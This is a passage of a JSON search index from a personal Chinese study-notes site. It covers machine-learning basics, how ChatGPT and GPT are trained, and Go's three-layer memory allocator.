{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u975e\u6cd5\u64cd\u4f5c\u7684\u7b14\u8bb0","text":"<p>\u4e3b\u8981\u7528\u4e8e\u8bb0\u5f55\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u7684\u91cd\u8981\u77e5\u8bc6\u70b9\uff0c\u5185\u5bb9\u5c5e\u4e8e\u52a0\u5de5\u63d0\u70bc\uff0c\u5927\u591a\u5e76\u975e\u539f\u521b\uff0c\u4e0d\u4f1a\u7528\u4e8e\u4f20\u64ad\uff0c\u6682\u672a\u6ce8\u660e\u51fa\u5904\u3002</p>"},{"location":"#_2","title":"\u601d\u7ef4\u5bfc\u56fe","text":"<p>\u4ee5\u4e0b\u94fe\u63a5\u8bb0\u5f55\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u6574\u7406\u7684\u601d\u7ef4\u5bfc\u56fe:  </p> <ul> <li>Redis</li> <li>Mysql</li> <li>Python</li> <li>Go</li> <li>\u8ba1\u7b97\u673a\u79d1\u5b66</li> <li>\u6570\u636e\u7ed3\u6784</li> <li>\u96e8\u75d5\u5b66\u5802</li> <li>AI</li> </ul>"},{"location":"ai/gai/","title":"Generative AI","text":""},{"location":"ai/gai/#_1","title":"\u673a\u5668\u5b66\u4e60","text":""},{"location":"ai/gai/#_2","title":"\u57fa\u672c\u6982\u5ff5","text":"<p>\u673a\u5668\u5b66\u4e60\u7684\u672c\u8d28\u5c31\u662f\u8ba9\u673a\u5668\u627e\u5230\u4e00\u4e2a\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u7684\u8f93\u5165\u548c\u8f93\u51fa\u53ef\u4ee5\u8fbe\u5230\u4eba\u7c7b\u7684\u9884\u671f\u3002</p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8eChatGPT\u6211\u4eec\u7684\u8f93\u5165\u53ef\u4ee5\u662f\u4e00\u4e2a\u95ee\u9898\u201c\u673a\u5668\u5b66\u4e60\u662f\u4ec0\u4e48\uff1f\u201d\uff0c\u8f93\u51fa\u662f\u4e00\u6bb5\u7b54\u6848\uff1b\u5bf9\u4e8eMidjourney\uff0c\u8f93\u5165\u662f\u4e00\u4e2a\u6307\u4ee4\u201c\u4e00\u53ea\u53ef\u7231\u7684\u732b\u201d\uff0c\u8f93\u51fa\u662f\u4e00\u5f20\u56fe\u7247\uff1bAlphaGo\uff0c\u8f93\u5165\u7684\u662f\u6574\u4e2a\u56f4\u68cb\u68cb\u76d8\u5404\u68cb\u5b50\u7684\u4f4d\u7f6e\uff0c\u8f93\u51fa\u662f\u4e0b\u4e00\u6b65\u7684\u4f4d\u7f6e\u3002</p> <p>\u6839\u636e\u51fd\u6570\u7c7b\u522b\u7684\u4e0d\u540c\uff0c\u53ef\u4ee5\u628a\u673a\u5668\u5b66\u4e60\u5206\u4e3a\uff1a</p> <ul> <li>\u56de\u5f52\uff08Regression\uff09\uff0c\u51fd\u6570\u7684\u8f93\u51fa\u662f\u4e00\u4e2a\u6570\u503c\u3002\u6bd4\u5982\u8f93\u5165\u4eca\u5929\u7684PM2.5\u6d53\u5ea6\u3001\u6c14\u6e29\u3001\u81ed\u6c27\u6d53\u5ea6\u7b49\uff0c\u9884\u6d4b\u660e\u5929\u7684PM2.5\u503c</li> <li>\u5206\u7c7b\uff08Classification\uff09\uff0c\u51fd\u6570\u7684\u8f93\u51fa\u662f\u4e00\u4e2a\u7c7b\u522b\u3002\u6bd4\u5982\u8f93\u5165\u4e00\u5c01\u90ae\u4ef6\uff0c\u8f93\u51fa\u5b83\u662f\u5426\u662f\u5783\u573e\u90ae\u4ef6</li> <li>\u751f\u6210\u5f0f\u5b66\u4e60\uff08Structured Learning\uff09\uff0c\u51fd\u6570\u7684\u8f93\u51fa\u662f\u6709\u7ed3\u6784\u7684\u4e1c\u897f\uff0c\u5305\u542b\u56fe\u50cf\u3001\u53e5\u5b50\u6bb5\u843d\u3001\u8bed\u97f3\u89c6\u9891\u7b49</li> </ul>"},{"location":"ai/gai/#_3","title":"\u627e\u5230\u51fd\u6570","text":"<p>\u90a3\u4e48\u673a\u5668\u5b66\u4e60\u7684\u6838\u5fc3\u95ee\u9898\u53d8\u6210\u4e86\u600e\u6837\u627e\u5230\u4e00\u4e2a\u51fd\u6570\uff1f\u8fd9\u9700\u8981\u4e09\u4e2a\u6b65\u9aa4\u3002\u5047\u8bbe\u6211\u4eec\u73b0\u5728\u7684\u4efb\u52a1\u662f\u8bc4\u4f30\u51fa\u4e00\u4e2a\u5b9d\u53ef\u68a6\u7cbe\u7075\u7684\u6218\u529b\u503c\u3002</p>"},{"location":"ai/gai/#1","title":"1. \u8bbe\u5b9a\u8303\u56f4","text":"<p>\u8bbe\u5b9a\u8303\u56f4\u5c31\u662f\u8981\u627e\u51fa\u4e00\u4e2a\u5019\u9009\u51fd\u6570\u7684\u96c6\u5408\uff08Model\uff09\uff0c\u800c\u6df1\u5ea6\u5b66\u4e60\u4e2d\u7c7b\u795e\u7ecf\u7f51\u7edc\u7684\u7ed3\u6784\uff08CNN\u3001RNN\u3001Transformer\u7b49\uff09\u5176\u5b9e\u6307\u7684\u5c31\u662f\u4e0d\u540c\u7684\u5019\u9009\u51fd\u6570\u96c6\u5408\u3002 </p>"},{"location":"ai/gai/#2","title":"2. \u8bbe\u5b9a\u6807\u51c6","text":"<p>\u8bbe\u5b9a\u6807\u51c6\u5c31\u662f\u8981\u627e\u51fa\u4e00\u4e2a\u8bc4\u4f30\u51fd\u6570\u597d\u574f\u7684\u6807\u51c6\uff08Loss Function\uff09\u3002</p> <p>\u90a3\u4e48\u5bf9\u4e8e\u76d1\u7763\u5f0f\u5b66\u4e60\uff08Supervised Learning\uff09\uff0c\u5c31\u76f8\u5f53\u4e8e\u5df2\u7ecf\u6709\u4e86\u4e00\u4e2a\u6d4b\u8bd5\u96c6\uff0c\u901a\u8fc7\u6bd4\u8f83\u8bad\u7ec3\u96c6\u548c\u6d4b\u8bd5\u96c6\u4e4b\u95f4\u7684\u5dee\u5f02\uff0c\u5c31\u80fd\u591f\u5f97\u5230\u51fd\u6570\u5230\u5e95\u597d\u4e0d\u597d\u3002  \u8fd9\u91cc\u8bad\u7ec3\u96c6\u5404\u4e2a\u51fd\u6570\u4e0e\u6b63\u786e\u7b54\u6848\u7684\u5dee\u5f02\u603b\u548c\u4e3a15,\u90a3\u4e48<code>L(f1)=15</code>\u3002</p> <p>\u5bf9\u4e8e\u534a\u76d1\u7763\u5f0f\u5b66\u4e60\uff08Semi-supervised Learning\uff09\uff0c\u5c31\u76f8\u5f53\u4e8e\u6211\u4eec\u7684\u6d4b\u8bd5\u96c6\u6570\u636e\u662f\u4e0d\u5b8c\u5168\u7684\uff0c\u53ef\u4ee5\u8bbe\u5b9a\u4e00\u4e2a\u6761\u4ef6\uff0c\u957f\u5f97\u50cf\u7684\u5b9d\u53ef\u68a6\u6218\u6597\u529b\u5e94\u8be5\u662f\u4e00\u81f4\u7684\u3002  <code>L(f1)=2+\u957f\u5f97\u50cf\u7684\u5b9d\u53ef\u68a6\u4e4b\u95f4\u7684\u5dee\u8ddd</code>\u3002</p>"},{"location":"ai/gai/#3","title":"3. \u8fbe\u6210\u76ee\u6807","text":"<p>\u8fbe\u6210\u76ee\u6807\u5c31\u662f\u8981\u627e\u51fa\u6700\u597d\u7684\u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u6700\u4f73\u5316\uff08Optimization\uff09\u3002  \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5c31\u662f\u8981\u627e\u5230\u51fd\u6570\u96c6\u5408H\u4e2d\u635f\u5931\u6700\u5c0f\u7684\u51fd\u6570\uff0c\u800c\u5e38\u89c1\u7684\u68af\u5ea6\u4e0b\u964d\uff08Gradient Descent\uff09\u3001\u540e\u5411\u4f20\u64ad\uff08Backpropagation\uff09\u4e5f\u662f\u5728\u505a\u7c7b\u4f3c\u7684\u4e8b\u60c5\u3002</p>"},{"location":"ai/gai/#_4","title":"\u5176\u4ed6","text":"<p> Optimization\u672c\u8d28\u4e0a\u4e5f\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u7684\u8f93\u5165\u5c31\u662f\u51fd\u6570\u96c6\u5408H\u548c\u635f\u5931\u51fd\u6570\uff0c\u800c\u5b83\u7684\u8f93\u51fa\u5c31\u662f\u627e\u5230\u635f\u5931\u6700\u5c0f\u7684\u51fd\u6570\u3002\u56e0\u4e3aH\u4e2d\u7684\u51fd\u6570\u6709\u5f88\u591a\uff0c\u6211\u4eec\u5f80\u5f80\u627e\u4e0d\u5230\u5176\u4e2d\u635f\u5931\u6700\u5c0f\u7684\u90a3\u4e00\u4e2a\uff0c\u5c31\u9700\u8981\u4eba\u5de5\u53bb\u4e0d\u65ad\u5730\u8c03\u6574Optimization\u7684\u8d85\u53c2\u6570\uff08Hyperparameter\uff09\uff0c\u4ee5\u66f4\u5feb\u7684\u627e\u5230\u4e00\u4e2a\u8fbe\u5230\u9608\u503c\u7684\u51fd\u6570\u6216\u8005\u627e\u5230\u4e00\u4e2a\u66f4\u4f4e\u635f\u5931\u7684\u51fd\u6570\u3002\u4e5f\u6709\u65f6\u5019\u600e\u6837\u8c03\u6574\u8d85\u53c2\u6570\u90fd\u6ca1\u6709\u7528\uff0c\u8fd9\u5c31\u8bf4\u660eOptimization\u5bf9\u8d85\u53c2\u6570\u4e0d\u654f\u611f\u3002</p> <p> \u6211\u4eec\u9700\u8981\u8bbe\u5b9a\u4e00\u4e2a\u8303\u56f4\u5185\u7684\u5019\u9009\u51fd\u6570\u96c6\u5408\uff0c\u800c\u4e0d\u662f\u628a\u6240\u6709\u7684\u51fd\u6570\u90fd\u653e\u5728\u96c6\u5408\u4e2d\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u9700\u8981\u627e\u5230\u7684\u662f\u4e00\u4e2a\u5728\u8bad\u7ec3\u96c6\u548c\u6d4b\u8bd5\u96c6\u90fd\u8868\u73b0\u5730\u5f88\u597d\u7684\u51fd\u6570\uff0c\u800c\u8303\u56f4\u592a\u5927\u5f88\u5bb9\u6613\u51fa\u73b0\u7684\u60c5\u51b5\u662f\u5728\u8bad\u7ec3\u96c6\u4e0a\u8868\u73b0\u597d\uff0c\u5374\u5728\u6d4b\u8bd5\u96c6\u4e0a\u8868\u73b0\u4e0d\u597d\u3002\u5728\u4e00\u4e2a\u591a\u5927\u7684\u8303\u56f4\u5185\u5bfb\u627e\uff0c\u5f80\u5f80\u53d6\u51b3\u4e8e\u7ecf\u9a8c\u4ee5\u53ca\u8bad\u7ec3\u8d44\u6599\u7684\u5927\u5c0f\uff0c\u8bad\u7ec3\u8d44\u6599\u8d8a\u591a\uff0c\u53ef\u4ee5\u53bb\u5212\u5b9a\u7684\u8303\u56f4\u5c31\u8d8a\u5927\u3002\u6bd4\u5982\uff0cSelf-attention\u7684\u8303\u56f4\u6bd4CNN\u8981\u5927\uff0c\u73b0\u5728\u8d8a\u6765\u8d8a\u591a\u7684\u56fe\u50cf\u8bad\u7ec3\u8f6c\u7528Self-attention\u5c31\u662f\u56e0\u4e3a\u8bad\u7ec3\u8d44\u6599\u53d8\u591a\u4e86\u3002</p>"},{"location":"ai/gai/#_5","title":"\u751f\u6210\u5f0f\u5b66\u4e60","text":""},{"location":"ai/gai/#chatgpt","title":"ChatGPT\u57fa\u672c\u539f\u7406","text":"<p> \u5f53\u6211\u4eec\u5411ChatGPT\u63d0\u51fa\u4e00\u4e2a\u95ee\u9898\u65f6\uff0c\u5b83\u672c\u8d28\u4e0a\u662f\u5728\u4e00\u4e2a\u6587\u5b57\u63a5\u9f99\u3002\u5b83\u4f1a\u628a\u5df2\u6709\u7684\u8fd9\u4e9b\u6587\u5b57\u5f53\u505a\u8f93\u5165\uff0c\u5f97\u5230\u4e00\u6279\u6587\u5b57\u7684\u6982\u7387\u5206\u5e03\uff0c\u4ece\u8fd9\u6279\u6587\u5b57\u4e2d\u968f\u673a\u9009\u62e9\u4e00\u4e2a\uff0c\u548c\u4e4b\u524d\u7684\u8f93\u5165\u4e00\u8d77\u518d\u6b21\u6267\u884c\u8ba1\u7b97\u4e0b\u4e00\u4e2a\u6587\u5b57\uff0c\u76f4\u5230\u9047\u5230\u4e00\u4e2a\u7279\u6b8a\u6807\u8bb0\u6bd4\u5982<code>END</code>\u3002\u8fd9\u5c31\u662f\u6bcf\u6b21\u6211\u4eec\u5411ChatGPT\u63d0\u51fa\u540c\u4e00\u4e2a\u95ee\u9898\uff0c\u5b83\u7684\u7b54\u6848\u53ef\u80fd\u4f1a\u53d8\u5316\u7684\u539f\u56e0\u3002</p> <p>\u4ece\u67d0\u79cd\u89d2\u5ea6\u4e0a\u8bb2\uff0cChatGPT\u4e5f\u5c5e\u4e8e\u673a\u5668\u5b66\u4e60\u4e2d\u7684\u9009\u62e9\u5206\u7c7b\u51fd\u6570\uff0c\u53ea\u4e0d\u8fc7\u5b83\u662f\u4ece\u6240\u6709\u7684\u6587\u5b57\u4e2d\u53bb\u9009\u62e9\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5e76\u4e0d\u65ad\u8fed\u4ee3\u8fd9\u4e00\u8fc7\u7a0b\uff0c\u6700\u540e\u7edf\u4e00\u5448\u73b0\u7ed3\u679c\u8ba9\u6211\u4eec\u8ba4\u4e3a\u5b83\u662f\u5c5e\u4e8e\u751f\u6210\u5f0f\u5b66\u4e60\u3002</p>"},{"location":"ai/gai/#gpt","title":"GPT\u7b80\u4ecb","text":"<p>GPT\uff08Generative Pre-trained Transformer\uff09\u662fChatGPT\u7684\u57fa\u77f3\u6a21\u578b\uff08Foundation Model\uff09\u3002</p> <p>\u4f20\u7edf\u7684\u76d1\u7763\u5f0f\u5b66\u4e60\u63d0\u4f9b\u7ed9\u6a21\u578b\u7684\u8bad\u7ec3\u8d44\u6599\u662f\u8f93\u5165\u8f93\u51fa\u4e00\u4e00\u5bf9\u5e94\u7684\uff0c\u6bd4\u5982\u8f93\u5165\u4e16\u754c\u7b2c\u4e00\u9ad8\u5cf0\u662f\u4ec0\u4e48\uff0c\u8f93\u51fa\u662f\u73e0\u7a46\u6717\u739b\u5cf0\u3002\u8fd9\u6837\u7684\u95ee\u9898\u662f\u6211\u4eec\u4eba\u7c7b\u80fd\u63d0\u4f9b\u7684\u6210\u5bf9\u7684\u8bad\u7ec3\u8d44\u6599\u662f\u6709\u9650\u7684\uff0c\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u79cd\u529e\u6cd5\u8ba9\u673a\u5668\u81ea\u5df1\u627e\u5230\u6210\u5bf9\u7684\u8f93\u5165\u8f93\u51fa\uff0c\u7f51\u7edc\u4e0a\u7684\u5404\u79cd\u8d44\u6599\u80fd\u591f\u76f4\u63a5\u5582\u7ed9\u5b83\u3002  \u81ea\u76d1\u7763\u5f0f\u5b66\u4e60\u8ba9\u673a\u5668\u80fd\u591f\u4ece\u7f51\u7edc\u4e0a\u6bcf\u4e00\u6bb5\u6587\u5b57\u5206\u6790\u51fa\u8f93\u5165\u8f93\u51fa\uff0c\u81ea\u5df1\u505a\u6587\u5b57\u63a5\u9f99\u3002</p> <p>\u4f7f\u7528\u8fd9\u4e2a\u7b56\u7565\uff0c2018\u5e74\u7684GPT\u7528\u4e861G\u7684\u6570\u636e\u548c1.17\u4ebf\u7684\u53c2\u6570\uff1b2019\u5e74\u7684GPT2\u4f7f\u7528\u4e8640G\u7684\u6570\u636e\u548c15.42\u4ebf\u4e2a\u53c2\u6570\uff1b2020\u5e74\u7684GPT3\u4f7f\u7528\u4e8645T\u7684\u6570\u636e\u548c175B\u4e2a\u53c2\u6570\u3002</p>"},{"location":"ai/gai/#_6","title":"\u9884\u8bad\u7ec3","text":"<p> GPT\u53ea\u4f7f\u7528\u7f51\u7edc\u4e0a\u7684\u8d44\u6599\u53bb\u505a\u6587\u5b57\u63a5\u9f99\u4e5f\u662f\u6709\u95ee\u9898\u7684\uff0c\u6bd4\u5982\u95ee\u5b83\u95ee\u9898\u7684\u65f6\u5019\uff0c\u5b83\u53ef\u80fd\u4e0d\u4f1a\u7ed9\u4e00\u4e2a\u7b54\u6848\uff0c\u800c\u662f\u4ece\u7f51\u7edc\u4e0a\u5b66\u4e60\u5230\u7684\u4e00\u4e2a\u8003\u9898\u9009\u9879\u3002  \u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u7ee7\u7eed\u53bb\u6559\u5bfc\u5b83\uff0c\u4eba\u7c7b\u7ed9\u5b83\u95ee\u9898\u7ed9\u5b83\u7b54\u6848\uff0c\u79f0\u4e4b\u4e3a\u76d1\u7763\u5f0f\u5b66\u4e60\uff08supervised learning\uff09\u3002\u5b83\u81ea\u5df1\u53bb\u722c\u53d6\u7f51\u7edc\u8d44\u6599\u81ea\u5df1\u505a\u6587\u5b57\u63a5\u9f99\u79f0\u4e4b\u4e3a\u81ea\u76d1\u7763\u5f0f\u5b66\u4e60\uff08self-supervised learning\uff09\u3002</p> <p>\u76d1\u7763\u5f0f\u5b66\u4e60\u7684\u8fc7\u7a0b\u662f\u771f\u6b63\u5728\u8bad\u7ec3\u7684\u8fc7\u7a0b\uff0c\u81ea\u76d1\u7763\u5f0f\u5b66\u4e60\u7684\u8fc7\u7a0b\u5c31\u662f\u9884\u8bad\u7ec3\uff08Pre-trained\uff09\u3002 \u9884\u8bad\u7ec3\u540e\u7684\u57fa\u77f3\u6a21\u578bGPT\u7ecf\u8fc7\u4e00\u7cfb\u5217\u6301\u7eed\u7684\u5b66\u4e60\u53d8\u6210ChatGPT\u7684\u8fc7\u7a0b\u79f0\u4e4b\u4e3a\u5fae\u8c03\uff08finetune\uff09\u3002</p> <p>\u6b64\u5916\uff0c\u9884\u8bad\u7ec3\u8fd8\u6709\u4e00\u4e2a\u597d\u5904\u662f\u5f53\u6211\u4eec\u5728\u591a\u79cd\u8bed\u8a00\u4e0a\u505a\u4e86\u9884\u8bad\u7ec3\u540e\uff0c\u53ea\u9700\u8981\u518d\u6559\u5b83\u67d0\u4e00\u4e2a\u8bed\u8a00\u4e0a\u7684\u67d0\u4e00\u9879\u4efb\u52a1\uff0c\u5b83\u5c31\u4f1a\u81ea\u52a8\u5b66\u4f1a\u5176\u4ed6\u8bed\u8a00\u4e0a\u7684\u540c\u6837\u4efb\u52a1\u3002</p>"},{"location":"ai/gai/#_7","title":"\u589e\u5f3a\u5f0f\u5b66\u4e60","text":"<p>\u4e0d\u540c\u4e8e\u76d1\u7763\u5f0f\u5b66\u4e60\u4eba\u7c7b\u8981\u63d0\u4f9b\u5b8c\u6574\u7684\u7b54\u6848\uff0c\u589e\u5f3a\u5f0f\u5b66\u4e60\uff08Reinforcement Learning\uff0cRL\uff09\u53ea\u9700\u8981\u4eba\u7c7b\u6807\u8bb0GPT\u751f\u6210\u7684\u7b54\u6848\u7684\u597d\u574f\u3002  \u4f8b\u5982\uff0c\u9488\u5bf9\u56fe\u4e2d\u7684\u95ee\u9898GPT\u8981\u751f\u6210\u4e24\u4e2a\u7b54\u6848\uff0c\u4eba\u7c7b\u5bf9\u5176\u6253\u5206\u540e\uff0c\u5b83\u4f1a\u628a\u5f97\u5206\u9ad8\u7684\u7b54\u6848\u7684\u751f\u6210\u6982\u7387\u8c03\u6574\u5730\u66f4\u9ad8\u3002\u8fd9\u4e5f\u8981\u6c42\u5927\u6a21\u578b\u5fc5\u987b\u8fbe\u5230\u4e00\u5b9a\u7a0b\u5ea6\u7684\u80fd\u529b\uff0c\u81f3\u5c11\u5076\u6709\u4f73\u4f5c\u65f6\uff0c\u624d\u80fd\u5f15\u5165\u589e\u5f3a\u5f0f\u5b66\u4e60\u3002</p> <p>\u5982\u679c\u53ea\u4f9d\u8d56\u4eba\u7c7b\u7684\u6253\u5206\uff0c\u4f9d\u7136\u5b58\u5728\u6548\u7387\u7684\u95ee\u9898\uff0cGPT\u8fd8\u4e13\u95e8\u989d\u5916\u8bad\u7ec3\u4e86\u4e00\u4e2a\u6a21\u578bReward Model\uff0c\u901a\u8fc7\u5b66\u4e60\u4eba\u7c7b\u7684\u6253\u5206\uff0c\u81ea\u5df1\u4e5f\u80fd\u591f\u5bf9\u6bcf\u6b21\u751f\u6210\u7684\u7b54\u6848\u6253\u5206\u3002</p> <p>\u7eb5\u89c2ChatGPT\u7684\u4ea7\u751f\u8fc7\u7a0b\uff0c\u5148\u662f\u7531\u4e00\u4e2a\u9884\u8bad\u7ec3\u7684GPT\u505a\u4e3a\u57fa\u77f3\u6a21\u578b\uff0c\u518d\u7ecf\u8fc7\u4e00\u5b9a\u7684\u76d1\u7763\u5f0f\u5b66\u4e60\u4f7f\u4e4b\u80fd\u591f\u6709\u6982\u7387\u4ea7\u751f\u4f18\u79c0\u7684\u7b54\u6848\uff0c\u6700\u540e\u901a\u8fc7\u589e\u5f3a\u5f0f\u5b66\u4e60\u4e0d\u65ad\u7684\u4f18\u5316\u5c31\u6709\u4e86ChatGPT\u3002\u76d1\u7763\u5f0f\u5b66\u4e60\u548c\u589e\u5f3a\u5f0f\u5b66\u4e60\u7684\u8fc7\u7a0b\u4e5f\u88ab\u79f0\u4e3a\u5bf9\u9f50\uff08Alignment\uff09\uff0c\u610f\u4e3a\u5bf9\u9f50\u4eba\u7c7b\u7684\u9700\u6c42\u3002</p>"},{"location":"ai/gai/#cot","title":"CoT","text":"<p>\u5728\u4f17\u591aPrompt\u6280\u5de7\u4e2d\uff0c\u9f13\u52b1ChatGPT\u4e00\u6b65\u6b65\u7684\u601d\u8003\u662f\u89e3\u51b3\u590d\u6742\u95ee\u9898\u6700\u5b9e\u7528\u7684\u4e00\u9879\uff0c\u8fd9\u88ab\u79f0\u4e3aChain of Thought\u3002\u6709\u8bba\u6587\u8868\u660e\uff0c\u5927\u6a21\u578b\u662f\u5426\u4f7f\u7528CoT\u5bf9\u7ed3\u679c\u6709\u76f8\u5f53\u5927\u7684\u5dee\u5f02\u3002 </p>"},{"location":"go/alloc/","title":"\u5185\u5b58\u5206\u914d","text":"<p>\u6709\u7684\u8bed\u8a00\u4f1a\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u6765\u7ba1\u7406\u5185\u5b58\uff0c\u4f8b\u5982C\u8bed\u8a00\u3002\u800c\u73b0\u4ee3\u5927\u591a\u6570\u7f16\u7a0b\u8bed\u8a00\u90fd\u4f1a\u81ea\u4e3b\u7ba1\u7406\u5185\u5b58\uff0c\u56e0\u4e3a\u8fd9\u6837\u80fd\u66f4\u597d\u7684\u89e3\u51b3\u5185\u5b58\u590d\u7528\u7684\u95ee\u9898\uff0c\u4fbf\u4e8e\u51cf\u5c11\u5185\u5b58\u7684\u788e\u7247\u5316\uff0c\u540c\u65f6\u53ef\u4ee5\u548c\u81ea\u5df1\u7684\u5783\u573e\u56de\u6536\u5668\u914d\u5408\u4e0d\u65ad\u7684\u8fed\u4ee3\u4f18\u5316\u66f4\u65b0\uff0c\u4e5f\u964d\u4f4e\u4e86\u5f00\u53d1\u8005\u7684\u95e8\u69db\u3002</p>"},{"location":"go/alloc/#_2","title":"\u4e09\u5c42\u7ed3\u6784","text":"<p>\u5bf9\u4e8eGo\u7684\u5185\u5b58\u5206\u914d\u5668\u6765\u8bb2\uff0c\u5b83\u6709\u4e00\u4e9b\u5904\u7406\u4f1a\u6bd4\u8f83\u9ebb\u70e6\uff0c\u56e0\u4e3a\u8981\u652f\u6301\u9ad8\u5e76\u53d1\uff0c\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u6709\u4e00\u5806\u4eba\u53bb\u62a2\u3002\u8fd9\u65f6\u5019\u6211\u4eec\u8003\u8651\u7684\u53ef\u80fd\u662f\u5206\u914d\u7684\u65f6\u5019\u7ed9\u6bcf\u4e2a\u4eba\u4e00\u4e2a\u76f8\u5bf9\u5927\u5757\u7684\u5185\u5b58\u6765\u51cf\u5c11\u5206\u914d\u7684\u6b21\u6570\uff0c\u4e5f\u5c31\u76f8\u5e94\u7684\u51cf\u5c11\u4e86\u7ade\u4e89\u7684\u6b21\u6570\u3002\u540c\u65f6\u8fd8\u8981\u8003\u8651\u4e0d\u7528\u65f6\u9700\u8981\u8fdb\u884c\u5185\u5b58\u56de\u6536\u6765\u590d\u7528\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u94a2\u94c1\u5382\u505a\u4e2a\u6bd4\u65b9\u3002\u6bcf\u4e2a\u4eba\u90fd\u9700\u8981\u7528\u94a2\u94c1\u505a\u4e1c\u897f\uff0c\u4ed6\u4eec\u7684\u7528\u9014\u53ef\u80fd\u4e0d\u592a\u76f8\u540c\uff0c\u6709\u4eba\u62ff\u6765\u505a\u5200\uff0c\u6709\u4eba\u62ff\u6765\u505a\u5251\uff0c\u6709\u4eba\u62ff\u6765\u505a\u68cd\u68d2\uff0c\u6709\u4eba\u62ff\u6765\u65e2\u505a\u5200\u53c8\u505a\u5251\u3002\u9762\u5bf9\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u76f4\u63a5\u628a\u94a2\u94c1\u5382\u7684\u94a2\u94c1\u7ed9\u7528\u6237\u81ea\u5df1\u53bb\u505a\u5c31\u4e0d\u592a\u5408\u9002\u4e86\uff0c\u5c31\u9700\u8981\u5728\u4e2d\u95f4\u52a0\u4e00\u5c42\u751f\u4ea7\u5546\u66f4\u5408\u7406\u3002</p> <p></p> <p>\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\u539f\u672c\u9700\u8981\u90fd\u53bb\u94a2\u94c1\u5382\u7ade\u4e89\u505a\u8fd9\u628a\u5200\u7684\u7528\u6237\uff0c\u73b0\u5728\u5728\u5236\u5200\u5382\u7ade\u4e89\u4e86\uff0c\u800c\u4e14\u82e5\u662f\u4e00\u4e2a\u7528\u6237\u505a\u5251\u3001\u53e6\u4e00\u4e2a\u7528\u6237\u505a\u68cd\uff0c\u73b0\u5728\u5219\u6ca1\u6709\u51b2\u7a81\u4e86\u3002\u5546\u54c1\u751f\u4ea7\u5546\u8fd9\u4e00\u5c42\u5206\u6563\u4e86\u7ade\u4e89\u6548\u5e94\uff0c\u539f\u672cx\u4e2a\u4eba\u9700\u8981\u7ade\u4e89\u4e00\u4e2a\u9501\u53d8\u6210\u4e86\u53ef\u4ee5\u7ade\u4e89n\u4e2a\u9501\u3002\u540c\u65f6\u4ecd\u7136\u53ef\u4ee5\u4e00\u6b21\u6027\u4e7010\u628a\u5200\uff0c\u6765\u51cf\u5c11\u548c\u5176\u4ed6\u4eba\u62a2\u7684\u6982\u7387\uff0c\u8fd910\u628a\u5200\u53ef\u4ee5\u7528\u6765\u63a5\u7740\u5185\u90e8\u5206\u914d\u5c31\u6ca1\u6709\u4eba\u4f1a\u6765\u62a2\uff0c\u5f53\u7136\u8fd9\u91cc\u4f1a\u6709\u4e00\u5b9a\u7684\u6d6a\u8d39\uff0c\u5c5e\u4e8e\u7a7a\u95f4\u6362\u65f6\u95f4\u7684\u505a\u6cd5\u3002</p> <p>\u5783\u573e\u56de\u6536\u7684\u65f6\u5019\uff0c\u5982\u679c10\u628a\u5200\u53ea\u7528\u4e862\u628a\uff0c\u5269\u4e0b\u76848\u628a\u5c31\u53ef\u4ee5\u8fd4\u8fd8\u7ed9\u5236\u5200\u5382\uff0c\u7ed9\u5176\u4ed6\u4eba\u7528\u3002\u8fd9\u5b9e\u73b0\u4e86\u4e00\u7ea7\u5e73\u8861\uff0c\u5373\u5728\u76f8\u540c\u7c7b\u578b\u4e4b\u95f4\u7684\u5e73\u8861\u3002\u4e5f\u6709\u53ef\u80fd\u7531\u4e8e\u79cd\u79cd\u539f\u56e0\u51fa\u73b0\u5200\u5197\u4f59\u975e\u5e38\u591a\u7684\u60c5\u51b5\uff0c\u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u628a\u5200\u8fd4\u8fd8\u7ed9\u94a2\u94c1\u5382\u5168\u90e8\u7194\u4e86\u505a\u5176\u4ed6\u4e1c\u897f\uff0c\u8fd9\u5c5e\u4e8e\u4e8c\u7ea7\u5e73\u8861\uff0c\u5728\u6750\u6599\u4e0a\u7684\u5e73\u8861\u3002</p> <p>\u901a\u8fc7\u8fd9\u4e09\u5c42\u7ed3\u6784\uff0c\u6211\u4eec\u5b9e\u73b0\u4e86\u4e24\u4e2a\u7ea7\u522b\u7684\u5e73\u8861\uff0c\u8fbe\u5230\u4e86\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u7684\u590d\u7528\u6548\u679c\u3002\u90a3\u4e48\u9700\u8981\u591a\u5c11\u79cd\u5546\u54c1\u751f\u4ea7\u5546\u5462\uff1f\u4e0d\u53ef\u80fd\u56e0\u4e3a\u6bcf\u4e2a\u4eba\u9700\u6c42\u4e0d\u540c\u5c31\u7ed9\u8bbe\u5b9a\u76f8\u5e94\u7684\u5546\u54c1\u751f\u4ea7\u5546\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u5546\u54c1\u8fdb\u884c\u5206\u7c7b\u3002\u5bf9\u4e8e\u5185\u5b58\u5206\u914d\u5668\u6765\u8bf4\uff0c\u5b83\u5173\u5fc3\u7684\u662f\u5546\u54c1\u5927\u5c0f\uff0c\u5148\u4ee532KB\u4e3a\u754c\uff0c\u628a\u5bf9\u8c61\u5206\u4e3a\u5927\u5bf9\u8c61\u548c\u5c0f\u5bf9\u8c61\u3002\u5bf9\u4e8e\u5927\u4e8e32KB\u7684\u5927\u5bf9\u8c61\uff0c\u7528\u6237\u4ee3\u7801\u4e2d\u8fd9\u79cd\u5bf9\u8c61\u5f80\u5f80\u5f88\u5c11\uff0c\u5206\u914d\u548c\u56de\u6536\u90fd\u53ef\u